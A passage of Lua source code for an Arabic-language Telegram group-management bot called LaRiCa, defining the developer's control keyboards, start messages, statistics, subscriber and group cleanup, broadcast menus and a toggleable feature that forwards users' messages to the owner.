Redis:set(LaRiCa.."Get:Reides:Commands:Group"..msg_chat_id..":"..'اس', 'رفع منشئ اساسي')
return LuaTele.sendText(msg_chat_id,msg_id,[[*
• تم ترتيب الاوامر بالشكل التالي • 
- ايدي - ا • 
- مميز - م • 
- ادمن - اد • 
- مدير - مد • 
- منشى - من • 
- المنشئ الاساسي - اس • 
- تعطيل الايدي بالصوره - تعط • 
- تفعيل الايدي بالصوره - تفع • 
*]],"md")
end
end -- GroupBot


if chat_type(msg.chat_id) == "UserBot" then 
if text == 'تحديث الملفات •' or text == 'تحديث' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
print('Chat Id : '..msg_chat_id)
print('User Id : '..msg_user_send_id)
LuaTele.sendText(msg_chat_id,msg_id, "• تم تحديث الملفات ","md",true)
dofile('LaRiCa.lua')  
end
if text == '/start' or text == "رجـوع •" then
Redis:sadd(LaRiCa..'Num:User:Pv',msg.sender.user_id)  
if not msg.Devss then
if not Redis:get(LaRiCa.."Start:Bot") then
local CmdStart = '\n⌔︰مرحبا انا بوت '..(Redis:get(LaRiCa.."Name:Bot") or "لاريكا")..
'\n⌔︰اختصاصي حمايه المجموعات'..
'\n⌔︰كما احتوي ايضا علي مميزات خدميه'..
'\n⌔︰للتفعيل اضفني مشرف في مجموعتك'..
'\n⌔︰وبعدها قم بكتابه كلمه تفعيل'..
'\n⌔︰ارسل /Play للستمتاع داخل البوت'..''
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = '• مطور البوت', url = 't.me/'..UserSudo}, },
{{text = '• اضف البوت الى مجموعتك', url = 't.me/'..UserBot..'?startgroup=new'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,CmdStart,"md",false, false, false, false, reply_markup)
else
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = '• مطور البوت', url = 't.me/'..UserBot..'?startgroup=new'}, },
{{text = '• اضف البوت الى مجموعتك', url = 't.me/'..UserSudo},},}}
return LuaTele.sendText(msg_chat_id,msg_id,Redis:get(LaRiCa.."Start:Bot"),"md",false, false, false, false, reply_markup)
end
else
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {
{{text = 'البوت •',type = 'text'}, },
{{text = 'التفعيل والتعطيل •',type = 'text'},{text = 'الاحصائيات •',type = 'text'}, },
{{text = 'الاذاعه •',type = 'text'},},
{{text = 'الاشتراك الاجباري •',type = 'text'},},
{{text = 'المطورين •',type = 'text'},{text = 'العام •',type = 'text'},},
{{text = 'تحديث الملفات •',type = 'text'}, },}}
return LuaTele.sendText(msg_chat_id,msg_id,'• ︙مرحبا عزيزي المطور \n• ︙انت المطور الاساسي هنا \n• ︙اليك ازرار 𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈. \n• ︙تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
end
if text == "التفعيل والتعطيل •" and msg.Devss then
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {
{{text = 'تفعيل التواصل •',type = 'text'},{text = 'تعطيل التواصل •', type = 'text'},},
{{text = 'تفعيل البوت الخدمي •',type = 'text'},{text = 'تعطيل البوت الخدمي •', type = 'text'},},
{{text = 'تفعيل الاذاعه •',type = 'text'},{text = 'تعطيل الاذاعه •',type = 'text'},},
{{text = 'تفعيل المغادره •',type = 'text'},{text = 'تعطيل المغادره •',type = 'text'},},
{{text = 'رجـوع •',type = 'text'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,'• ︙اهلا بك مجددا عزيزي المطور \n• ︙اليك الازرار الخاصه ب التفعيل والتعطيل ل𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈. فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
if text == "الاحصائيات •" and msg.Devss then
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {
{{text = 'الاحصائيات  •',type = 'text'},},
{{text = 'تنظيف المجموعات •',type = 'text'},{text = 'تنظيف المشتركين •', type = 'text'},},
{{text = 'جلب النسخه الاحتياطيه •',type = 'text'},},
{{text = 'رجـوع •',type = 'text'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,'• ︙اهلا بك مجددا عزيزي المطور \n• ︙اليك الازرار الخاصه ب أحصائيات  𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈. فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
if text == "الاشتراك الاجباري •" and msg.Devss then
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {
{{text = 'تعطيل الاشتراك الاجباري •',type = 'text'},{text = 'تفعيل الاشتراك الاجباري •', type = 'text'},},
{{text = 'تعطيل الاشتراك الاجباري لكل الاعضاء •',type = 'text'},{text = 'تفعيل الاشتراك الاجباري لكل الاعضاء •', type = 'text'},},
{{text = 'الغاء •',type = 'text'},},
{{text = 'رجـوع •',type = 'text'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,'• ︙اهلا بك مجددا عزيزي المطور \n• ︙اليك الازرار الخاصه ب أحصائيات  𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈. فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
if text == "المطورين •" and msg.Devss then
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {
{{text = 'المطورين الثانويين •',type = 'text'},{text = 'مسح المطورين الثانويين •',type = 'text'},},
{{text = 'المطورين  •',type = 'text'},{text = 'مسح المطورين •',type = 'text'},},
{{text = 'تغيير المطور الاساسي •',type = 'text'} },
{{text = 'تغيير كليشه المطور •',type = 'text'},{text = 'حذف كليشه المطور •', type = 'text'},},
{{text = 'الغاء •',type = 'text'},},
{{text = 'رجـوع •',type = 'text'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,'• ︙اهلا بك مجددا عزيزي المطور \n• ︙اليك الازرار الخاصه ب المطورين ل𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈. فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
if text == "الاذاعه •" and msg.Devss then
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {
{{text = 'اذاعه بالتثبيت •',type = 'text'},},
{{text = 'اذاعه للمجموعات •',type = 'text'},{text = 'اذاعه خاص •', type = 'text'},},
{{text = 'اذاعه بالتوجيه •',type = 'text'},{text = 'اذاعه بالتوجيه خاص •', type = 'text'},},
{{text = 'الغاء •',type = 'text'},},
{{text = 'رجـوع •',type = 'text'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,'• ︙اهلا بك مجددا عزيزي المطور \n• ︙اليك الازرار الخاصه بالاذاعه ل𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈. فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
if text == "العام •" and msg.Devss then
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {
{{text = 'اضف رد عام •',type = 'text'},{text = 'حذف رد عام •', type = 'text'},},
{{text = 'الردود العامه •',type = 'text'},{text = 'مسح الردود العامه •', type = 'text'},},
{{text = 'قائمه العام •', type = 'text'},{text = 'مسح قائمه العام •', type = 'text'},},
{{text = 'الغاء •',type = 'text'},},
{{text = 'رجـوع •',type = 'text'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,'• ︙اهلا بك مجددا عزيزي المطور \n• ︙اليك الازرار الخاصه بالعام ل𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈. فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
if text == "البوت •" and msg.Devss then
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {
{{text = 'تغيير اسم البوت •',type = 'text'},{text = 'حذف اسم البوت •', type = 'text'},},
{{text = 'تغيير كليشه ستارت •',type = 'text'},{text = 'حذف كليشه ستارت •', type = 'text'},},
{{text = 'الغاء •',type = 'text'},},
{{text = 'رجـوع •',type = 'text'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,'• ︙اهلا بك مجددا عزيزي المطور \n• ︙اليك الازرار الخاصه ببوتك المثبت علئ ل𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈. فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
if text == '/votlx' or text == '/Play' then
Redis:sadd(LaRiCa..'Num:User:Pv',msg.sender.user_id)  
if not msg.DevelopersQ then
if not Redis:get(LaRiCa.."Start:Bot") then
local CmdStart = '\n• مرحبا بك عزيزي مجددا'..
'\n• اليك كيبورد الاعضاء'
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = 'متحركه',type = 'text'},{text = 'ميمز', type = 'text'},
},
{
{text = 'اغنيه',type = 'text'},{text = 'صوره', type = 'text'},
},
{
{text = 'تيك توك',type = 'text'},{text = 'شعر', type = 'text'},
},
{
{text = 'فلم',type = 'text'},{text = 'انمي', type = 'text'}, 
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,CmdStart,"md",false, false, false, false, reply_markup)
else
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = 'متحركه',type = 'text'},{text = 'ميمز', type = 'text'},
},
{
{text = 'اغنيه',type = 'text'},{text = 'صوره', type = 'text'},
},
{
{text = 'تيك توك',type = 'text'},{text = 'شعر', type = 'text'},
},
{
{text = 'فلم',type = 'text'},{text = 'انمي', type = 'text'}, 
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,Redis:get(LaRiCa.."Start:Bot"),"md",false, false, false, false, reply_markup)
end
else
local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = '〘 المطور 〙',type = 'text'},{text = '〘 المساعد 〙', type = 'text'},
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,'*اليك اوامر كيب المطور الأساسي*', 'md', false, false, false, false, reply_markup)
end
end
--     Source LaRiCa     --
--     end start chat Pv     --
if text == 'تنظيف المشتركين •' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."Num:User:Pv")   
local x = 0
for k,v in pairs(list) do  
local Get_Chat = LuaTele.getChat(v)
local ChatAction = LuaTele.sendChatAction(v,'Typing')
if ChatAction.luatele ~= "ok" then
x = x + 1
Redis:srem(LaRiCa..'Num:User:Pv',v)
end
end
if x ~= 0 then
return LuaTele.sendText(msg_chat_id,msg_id,'*• العدد الكلي { '..#list..' }\n• تم العثور على { '..x..' } من المشتركين حاظرين البوت*',"md")
else
return LuaTele.sendText(msg_chat_id,msg_id,'*• العدد الكلي { '..#list..' }\n• لم يتم العثور على وهميين*',"md")
end
end
if text == 'تنظيف المجموعات •' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."ChekBotAdd")   
local x = 0
for k,v in pairs(list) do  
local Get_Chat = LuaTele.getChat(v)
if Get_Chat.id then
local statusMem = LuaTele.getChatMember(Get_Chat.id,LaRiCa)
if statusMem.status.luatele == "chatMemberStatusMember" then
x = x + 1
LuaTele.sendText(Get_Chat.id,0,'*• البوت عضو في الكروب سوف اغادر ويمكنك تفعيلي مره اخره*',"md")
Redis:srem(LaRiCa..'ChekBotAdd',Get_Chat.id)
local keys = Redis:keys(LaRiCa..'*'..Get_Chat.id)
for i = 1, #keys do
Redis:del(keys[i])
end
LuaTele.leaveChat(Get_Chat.id)
end
else
x = x + 1
local keys = Redis:keys(LaRiCa..'*'..v)
for i = 1, #keys do
Redis:del(keys[i])
end
Redis:srem(LaRiCa..'ChekBotAdd',v)
LuaTele.leaveChat(v)
end
end
if x ~= 0 then
return LuaTele.sendText(msg_chat_id,msg_id,'*• العدد الكلي { '..#list..' } للمجموعات \n• تم العثور على { '..x..' } مجموعات البوت ليس ادمن \n• تم تعطيل الكروب ومغادره البوت من الوهمي*',"md")
else
return LuaTele.sendText(msg_chat_id,msg_id,'*• العدد الكلي { '..#list..' } للمجموعات \n• لا توجد مجموعات وهميه*',"md")
end
end
if text == 'تغيير كليشه ستارت •' then 
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(LaRiCa.."Change:Start:Bot"..msg.sender.user_id,300,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل لي كليشه Start الان ","md",true)  
end
if text == 'حذف كليشه ستارت •' then 
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Start:Bot") 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف كليشه Start ","md",true)   
end
if text == 'تغيير اسم البوت •' then 
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(LaRiCa.."Change:Name:Bot"..msg.sender.user_id,300,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل لي الاسم الان ","md",true)  
end
if text == 'حذف اسم البوت •' then 
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Name:Bot") 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف اسم البوت ","md",true)   
end
if text and text:match("^تعين عدد الاعضاء (%d+)$") then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa..'Num:Add:Bot',text:match("تعين عدد الاعضاء (%d+)$") ) 
LuaTele.sendText(msg_chat_id,msg_id,'*• تم تعيين عدد اعضاء تفعيل البوت اكثر من : '..text:match("تعين عدد الاعضاء (%d+)$")..' عضو*',"md",true)  
elseif text =='الاحصائيات  •' then 
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
LuaTele.sendText(msg_chat_id,msg_id,'*• عدد احصائيات البوت الكامله \nٴ— — — — — — — — — —\n• عدد المجموعات : '..(Redis:scard(LaRiCa..'ChekBotAdd') or 0)..'\n• عدد المشتركين : '..(Redis:scard(LaRiCa..'Num:User:Pv') or 0)..'*',"md",true)  
end
if text == 'تغيركليشه المطور •' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa..'GetTexting:DevLaRiCa'..msg_chat_id..':'..msg.sender.user_id,true)
return LuaTele.sendText(msg_chat_id,msg_id,'• ارسل لي الكليشه الان')
end
if text == 'حذف كليشه المطور •' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa..'Texting:DevLaRiCa')
return LuaTele.sendText(msg_chat_id,msg_id,'• تم حذف كليشه المطور')
end
if text == ("الردود العامه •") then 
if not msg.Devss then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."List:Rd:Sudo")
text = "\n• قائمة الردود العامه \nٴ— — — — — — — — — —\n"
for k,v in pairs(list) do
if Redis:get(LaRiCa.."Add:Rd:Sudo:Gif"..v) then
db = "متحركه •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:vico"..v) then
db = "بصمه •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:stekr"..v) then
db = "ملصق •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:Text"..v) then
db = "رساله •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:Photo"..v) then
db = "صوره •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:Video"..v) then
db = "فيديو •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:File"..v) then
db = "ملف •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:Audio"..v) then
db = "اغنيه •"
elseif Redis:get(LaRiCa.."Add:Rd:Sudo:video_note"..v) then
db = "بصمه فيديو •"
end
text = text..""..k.." » {"..v.."} » {"..db.."}\n"
end
if #list == 0 then
text = "• لا توجد ردود للمطور"
end
return LuaTele.sendText(msg_chat_id,msg_id,"["..text.."]","md",true)  
end
if text == 'مسح المطورين •' then
if not msg.Devss then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Dev:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مطورين حاليا , ","md",true)  
end
Redis:del(LaRiCa.."Dev:Groups") 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المطورين*","md",true)
end
if text == 'مسح المطورين الثانويين •' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Devss:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مطورين حاليا , ","md",true)  
end
Redis:del(LaRiCa.."Devss:Groups") 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المطورين*","md",true)
end
if text == 'المطورين  •' then
if not msg.Devss then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Dev:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مطورين حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه مطورين البوت \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = '• مسح المطورين', data = msg.sender.user_id..'/Dev'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المطورين الثانويين •' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Devss:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مطورين حاليا , ","md",true)  
end
ListMembers = '\n*• قائمه مطورين الثانويين \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = '• مسح المطورين الثانويين', data = msg.sender.user_id..'/Devss'},},}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'تعطيل البوت الخدمي •' then
if not msg.Devss then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."BotFree") 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل البوت الخدمي ","md",true)
end
if text == 'تعطيل التواصل •' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."TwaslBot") 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل التواصل داخل البوت ","md",true)
end
if text == 'تفعيل البوت الخدمي •' then
if not msg.Devss then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."BotFree",true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل البوت الخدمي ","md",true)
end
if text == 'تفعيل التواصل •' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."TwaslBot",true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل التواصل داخل البوت ","md",true)
end
if not msg.ControllerBot then
if Redis:get(LaRiCa.."TwaslBot") and not Redis:sismember(LaRiCa.."BaN:In:Tuasl",msg.sender.user_id) then
local ListGet = {Sudo_Id,msg.sender.user_id}
local IdSudo = LuaTele.getChat(ListGet[1]).id
local IdUser = LuaTele.getChat(ListGet[2]).id
local FedMsg = LuaTele.sendForwarded(IdSudo, 0, IdUser, msg_id)
Redis:setex(LaRiCa.."Twasl:UserId"..msg.date,172800,IdUser)
if FedMsg.content.luatele == "messageSticker" then
LuaTele.sendText(IdSudo,0,Reply_Status(IdUser,'• قام بارسال الملصق').Reply,"md",true)  
end
